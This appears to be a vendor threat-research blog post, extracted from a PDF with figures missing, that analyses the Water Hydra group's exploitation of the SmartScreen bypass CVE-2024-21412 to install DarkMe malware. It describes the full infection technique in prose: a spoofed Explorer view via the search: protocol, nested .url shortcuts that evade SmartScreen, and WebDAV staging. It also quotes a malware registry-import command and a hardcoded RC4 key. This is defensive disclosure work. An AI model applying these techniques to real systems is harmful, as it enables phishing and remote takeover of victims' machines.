CVE-2024-21412: Water Hydra Targets Traders With
Microsoft Defender SmartScreen Zero-Day
⋮ 2/13/2024
Exploits & Vulnerabilities
The APT group Water Hydra has been exploiting the Microsoft Defender SmartScreen vulnerability (CVE-2024-
21412) in its campaigns targeting financial market traders. This vulnerability, which has now been patched by
Microsoft, was discovered and disclosed by the Trend Micro Zero Day Initiative.

The Trend Micro Zero Day Initiative discovered the vulnerability CVE-2024-21412 which we track as ZDI-CAN-23100,
and alerted Microsoft of a Microsoft Defender SmartScreen bypass used as part of a sophisticated zero-day attack
chain by the  advanced persistent threat (APT) group we track as Water Hydra (aka DarkCasino) that targeted
financial market traders.
In late December 2023, we began tracking a campaign by the Water Hydra group that contained similar tools, tactics,
and procedures (TTPs) that involved abusing internet shortcuts (.URL) and Web-based Distributed Authoring and
Versioning (WebDAV) components. In this attack chain, the threat actor leveraged CVE-2024-21412 to bypass
Microsoft Defender SmartScreen and infect victims with the DarkMe malware. In cooperation with Microsoft, the ZDI
bug bounty program worked to disclose this zero-day attack and ensure a rapid patch for this vulnerability. Trend also

provides protection to users from threat actors that exploit CVE-2024-21412 via the security solutions that can be
found at end of this blog entry.
About the Water Hydra APT group
The Water Hydra group was first detected in 2021, when it gained notoriety for targeting the financial industry,
launching attacks against banks, cryptocurrency platforms, forex and stock trading platforms, gambling sites, and
casinos worldwide.
Initially, the group’s attacks were attributed to the Evilnum APT group due to similar phishing techniques and other
TTPs. In September 2022, researchers at NSFOCUS found the VisualBasic remote access tool (RAT) called DarkMe
as part of a campaign named DarkCasino, which targeted European traders and gambling platforms.
By November 2023, after several successive campaigns, including one that used the well-known WinRAR code
execution vulnerability CVE-2023-38831 in the attack chain to target stock traders, it became evident that Water
Hydra was its own APT group distinct from Evilnum.
Water Hydra’s attack patterns show significant levels of technical skill and sophistication, including the ability to use
undisclosed zero-day vulnerabilities in attack chains. For example, the Water Hydra group exploited the
aforementioned CVE-2023-38831 as a zero-day to target cryptocurrency traders in April 2023 — months before
disclosure. Since its disclosure, CVE-2023-38831 has also been exploited by other APT groups such as APT28
(FROZENLAKE), APT29 (Cozy Bear), APT40, Dark Pink, Ghostwriter, Konni, and Sandworm.
Water Hydra attack chain and TTPs
Throughout our investigation, we observed the Water Hydra APT group updating and testing new deployments of
their attack chain.

Infection chain analysis
In this section, we will analyze the full Water Hydra campaign exploiting CVE-2024-21412 to bypass Microsoft
Defender SmartScreen to infect users with DarkMe malware.
Initial Access: spearphishing attempts on forex forums
5/21
In the attack chain, Water Hydra deployed a spearphishing campaign (T1566.002) on forex trading forums and stock
trading Telegram channels to lure potential traders into infecting themselves with DarkMe malware using various
social engineering techniques, such as posting messages asking for or providing trading advice, sharing fake stock
and financial tools revolving around graph technical analysis, graph indicator tools, all of which were accompanied by
a URL pointing to a trojan horse stock chart served from a compromised Russian trading and cryptocurrency
information site (fxbulls[.]ru).
Figure 3. Threat Actor’s spearphishing posts on a popular forex trading forum
download
It’s interesting to note that this compromised WordPress site shares the same name as an actual forex broker,
fxbulls[.]com, but is hosted on a Russian (.ru) domain.
Figure 4. Comparison of fxbulls.ru (left) and fxbulls.com (right)
download
6/21
The fxbulls[.]com broker uses the MetaTrader 4 (MT4) trading platform, which was removed from the Apple App Store
in September 2022 due to Western sanctions against Russia. However, Apple reinstated both MT4 and another
MetaTrader version (MT5) by March 2023.
Initial Access: using JPEG images as lures
During our analysis of the spearphishing campaign on the forex trading forums, we uncovered a considerable number
of posts by Water Hydra in both the English and Russian languages. Often, these posts would reply to general forex
or stock trading questions regarding the technical analysis of trading charts and included a link to a stock chart as a
lure.
However, instead of the expected stock chart, these posts linked back to an HTM/HTML landing page hosted on a
compromised Russian language forex, stock, and cryptocurrency news site hosted on WordPress with a landing page
showing a second malicious link. This lure, disguised as a link to a JPEG file, points to a WebDAV share. Many of the
accounts we uncovered posting links to the malicious fxbulls[.]ru site were years old, indicating that DarkMe may
have compromised legitimate user accounts on trading forums as part of its campaign.
Figure 5. The malicious landing page on fxbulls[.]ru
download
The landing page on fxbulls[.]ru contains a link to a malicious WebDAV share with a filtered crafted view. When users
click on this link, the browser will ask them to open the link in Windows Explorer. This is not a security prompt, so the
user might not think that this link is malicious.

download
7/21
Figure 6 shows the JPEG trojan horse linking back to a WebDAV share using Windows Advanced Query Syntax
(AQS).
Initial Access: using PDF files as lures
As the Water Hydra campaign progressed, we noticed a shift to an additional lure in the form of a PDF file. These
internet shortcuts disguised as PDF files have the same functionality as the JPEG lure that bootstraps the infection
process. These PDF lures are also served from the compromised fxbulls[.]ru domain. These PDF lures can be
delivered via phishing emails in the form of fake financial contracts.

download
Initial Access: using the search: protocol to customize the Windows
Explorer window
In this campaign, Water Hydra employs an interesting technique to lure victims into clicking a malicious Internet
Shortcut (.url) file. This TTP abuses the Microsoft Windows search: Application Protocol, which is distinct from the
more common ms-search protocol. The search: protocol, which has been a part of Windows since Vista, invokes the
Windows desktop search application. During the infection chain, Water Hydra uses the search: protocol with
crafted Advanced Query Syntax (AQS) queries to customize the appearance of the Windows Explorer view in order
to trick victims.
8/21
Figure 8. HTML abusing the search: protocol
download
Figure 8 shows the HTML containing the malicious search: URL. Note the following characteristics of the URL:
       It uses the search: application protocol search to perform a search for photo_2023-12-29.jpg.
       It uses the crumb parameter to constrain the scope of the search to the malicious WebDAV share.
       It uses the DisplayName element to deceive users into thinking that this is the local Downloads folder.
Figure 9. The Malicious WebDAV Share with the view filtered
download
After clicking the link shown in Figure 8, we can see how the Windows Explorer view is presented to the victim
(Figure 8). By using a combination of search protocols, AQS queries, and the DisplayName element, the Water Hydra
operators can trick users into believing that the file from the malicious WebDAV server has been downloaded, tricking
them into clicking this malicious file (a fake JPEG image). This Explorer window is a carefully crafted view of a
malicious .url file named photo_2023-12-29.jpg.url. Microsoft Windows automatically hides the .url extension, making
it appear from the filename that the file is a JPEG image.
Execution: exploiting CVE-2024-21412 (ZDI-CAN-23100) to bypass
Microsoft Defender SmartScreen
9/21
CVE-2024-21412 revolves around internet shortcuts. These .url files are simple INI configuration files that take a
“URL=” parameter pointing to a URL. While the .url file format is not officially documented, the URL parameter is the
only one required for this file type.
During our analysis of this malicious .url file, we also noticed that Water Hydra used the imagress.dll (Windows Image
Resource) icon library to change the default internet shortcut file to the image icon using the IconFile= and
IconIndex= parameters to further deceive users and add legitimacy to the trojan horse internet shortcut. Through a
simple double-click of this internet shortcut disguised as a JPEG, the Water Hydra operators can bypass Microsoft
Defender SmartScreen by exploiting CVE-2024-21412 and fully compromise the Windows host.
While analyzing the CVE-2024-21412-infected internet shortcut file, we noticed something unusual. The URL=
parameter of the photo_2023-12-29.jpg.url file pointed to another internet shortcut file hosted on a server with a
dotted quad address (IPv4).
Figure 10. The photo_2023-12-29.jpg.url internet shortcut points to another internet shortcut file
download
During our analysis of the malicious WebDAV share, we were able to obtain all the Water Hydra artifacts, including
the referenced 2.url internet shortcut. Following this reference trail, we discovered that the 2.url contained the logic to
exploit the previously patched Microsoft Defender SmartScreen bypass identified as CVE-2023-36025. During our
recent research, we delved into a campaign targeting this CVE.
Figure 11. The 2.url internet shortcut points to a CMD shell script within a ZIP archive
download
It’s highly unusual to reference an internet shortcut within another internet shortcut. Because of this anomalous
behavior, we created a proof-of-concept (PoC) to perform further testing and analysis. During this PoC testing, ZDI
discovered that the initial shortcut (which referenced the second shortcut) managed to bypass the patch that
addressed CVE-2023-36025, evading SmartScreen protections. Through the analysis and testing of an internal PoC,
we concluded that calling a shortcut within another shortcut was sufficient to evade SmartScreen, which failed to
properly apply Mark-of-the-Web (MotW), a critical Windows component that alerts users when opening or running
files from an untrusted source. After our analysis, we contacted Microsoft MSRC to alert them about an active
SmartScreen zero-day being exploited in the wild and provided them with our proof-of-concept exploit.
10/21
Figure 12. A Microsoft Defender SmartScreen Window as it should appear after applying MotW

By crafting the Windows Explorer view, Water Hydra is able to entice victims into clicking on an exploit for CVE-2024-
21412, which in turn executes code from an untrusted source, relying on Windows being unable to apply MotW
correctly and resulting in a lack of SmartScreen protections. The infection chain simply runs in the background and
the infected user has no knowledge of this.
Figure 13. The a2.cmd file copies and runs a DarkMe loader called b3.dll
download
After bypassing SmartScreen, the second 2.url shortcut runs a batch file embedded in a ZIP file from the attacker's
WebDAV share. This batch script copies and executes a DarkMe dynamic-link library (DLL) loader from the malicious
WebDAV share. It’s alarming that this entire sequence runs without the user's knowledge and SmartScreen
protections. The end user is given little to no indication that anything is afoot.

can observe several Property Find (PROPFIND) requests to retrieve XML-stored properties from the WebDAV server.

Once the exploitation and infection chains are complete, the threat actor connects to its C&C WebDAV server to
download a real JPEG file, which has the same name as the Trojan horse JPEG that was used to exploit CVE-2024-
21412. This file is then displayed to the victim, who is deceived into thinking that they have opened the JPEG file they
originally intended to view from their Downloads folder (without any knowledge about the DarkMe infection).

Table 1. Properties of the DarkMe downloader (b3.dll)
The DarkMe downloader is a DLL, written in Visual Basic, that is responsible for downloading and executing the next
stage payload from the attacker's WebDAV. The malware carries out its actions by running a series of commands
through the cmd.exe command interpreter. Within the malware, these commands are scrambled using a reverse
string technique. To execute the commands, it first reconstructs them by employing the Strings.StrReverse method to
reverse the string order back to normal, after which it executes them via the shell method. It’s important to note that
the malware is loaded with junk code to disguise its true purpose and to complicate reverse engineering. For the sake
13/21
of research and easier understanding, all the code snippets in this blog entry are presented in a deobfuscated,
cleaner form.
The following snippet illustrates how the malware performs the above operations:

Table 3. Properties of the DarkMe loader (undersets.dll)
Upon execution, the malware builds a DarkMe payload by merging the contents of two binary files — a1 and a2 —
into a single new file, C:\Users\admin\AppData\Roaming\OnlineProjects\OnlineProject.dll.
To avoid exposing important strings directly within the binary, the malware encodes them in hexadecimal format. It
subsequently decodes these into their ASCII representations during execution as necessary.
To simplify research and enhance readability, all the junk code has been removed and hex-encoded data converted
to ASCII format.
The malware constructs and executes the following command that leverages the reg.exe utility to import registry
settings from the kb.txt file:
15/21
"C:\Windows\System32\cmd.exe" /c cd C:\Users\admin\AppData\Roaming\OnlineProjects&&cmd /c timeout 1&&cmd
/c reg.exe import kb.txt
These settings are related to registering DarkMe payload OnlineProject.dll as a COM server and setting up its
configuration in the system's registry.

Table 4. Properties of the DarkMe RAT (OnlineProject.dll)
The final delivery of this attack is a RAT known as DarkMe. Like the loader and downloader modules, this malware is
a DLL file and written in Visual Basic. However, this final module has a higher amount of obfuscation and junk code
compared to the previous two. The malware communicates with its C&C server using a custom protocol over TCP.
Upon execution, the malware gathers information from the infected system, including the computer name, username,
installed antivirus software, and the title of the active window. It then registers itself with the attacker's C&C server.
To establish network communication and handle socket messages, the malware creates a hidden window named
SOCKET_WINDOW with STATIC type using the CreateWindowEx Windows API. This hidden window facilitates
communication with the server by channeling socket data through window messages.

The C&C domain is encrypted using RC4 and stored in a VB.Form TextBox named Text2022. The malware decrypts
it using a hardcoded key, "noway123!$#@35@!".

up a separate timer called Timer3 with an interval of “5555 milliseconds” for this task. Figure 26 shows an example of
this traffic (some variants of DarkMe send a different value):

Once the malware registers its victim, it then initiates a listener for incoming TCP connections, waiting to receive
commands from the attacker. Once a command is received, the malware parses and executes it on the infected
system. The malware supports a wide range of functionalities. The supported commands would allow malware to
Enumerate directory content (STRFLS, STRFL2), execute shell commands (SHLEXE), create and delete directories,
retrieve system drive information (300100), and generate a ZIP file from given path (ZIPALO), among others.
Conclusion
Zero-day attacks represent a significant security risk to organizations, as these attacks exploit vulnerabilities that are
unknown to software vendors and have no corresponding security patches. APT groups such as Water Hydra
possess the technical knowledge and tools to discover and exploit zero-day vulnerabilities in advanced campaigns,
deploying highly destructive malware such as DarkMe.
In a previous campaign, Water Hydra exploited CVE-2023-38831 months before organizations could defend
themselves. After disclosure, CVE-2023-38831 was subsequently deployed in other campaigns by other APT groups.
ZDI has noticed several alarming trends in zero-day abuse. First, there exists a trend where zero-days found by
cybercrime groups make their way into attack chains deployed by nation-state APT groups such as APT28
(FROZENLAKE), APT29 (Cozy Bear), APT40, Dark Pink, Ghostwriter, Konni, Sandworm and more. These groups
employ these exploits to launch sophisticated attacks, thereby exacerbating risks to organizations. Second, the
simple bypass of CVE-2023-36025 by CVE-2024-21412 highlights a broader industry trend when it comes to security
patches that show how APT threat actors can easily circumvent narrow patches by identifying new vectors of attack
around a patched software component.
20/21
To make software more secure and protect customers from zero-day attacks, the Trend Zero Day Initiative works with
security researchers and vendors to patch and responsibly disclose software vulnerabilities before APT groups can
deploy them in attacks. The ZDI Threat Hunting team also proactively hunts for zero-day attacks in the wild to
safeguard the industry.
Organizations can protect themselves from these kinds of attacks with Trend Vision One™️, which enables security
teams to continuously identify attack surfaces, including known, unknown, managed, and unmanaged cyber assets.
Vision One helps organizations prioritize and address potential risks, including vulnerabilities. It considers critical
factors such as the likelihood and impact of potential attacks and offers a range of prevention, detection, and
response capabilities. This is all backed by advanced threat research, intelligence, and AI, which helps reduce the
time taken to detect, respond, and remediate issues. Ultimately, Vision One can help improve the overall security
posture and effectiveness of an organization, including against zero-day attacks.
When faced with uncertain intrusions, behaviors, and routines, organizations should assume that their system is
already compromised or breached and work to immediately isolate affected data or toolchains. With a broader
perspective and rapid response, organizations can address breaches and protect its remaining systems, especially
with technologies such as  Trend Micro Endpoint Security and Trend Micro Network Security, as well
as comprehensive security solutions such as Trend Micro™ XDR, which can detect, scan, and block malicious
content across the modern threat landscape.
Epilogue
During our investigation into CVE-2024-21412 and Water Hydra we began tracking additional threat actor activity
around this zero-day. In particular, the DarkGate malware operators began incorporating this exploit into their
infection chains. We will be providing additional information and analysis on threat actors that have exploited CVE-
2024-21412 in a future blog entry. Trend Micro customers are protected from these additional campaigns via virtual
patches for ZDI-CAN-23100.
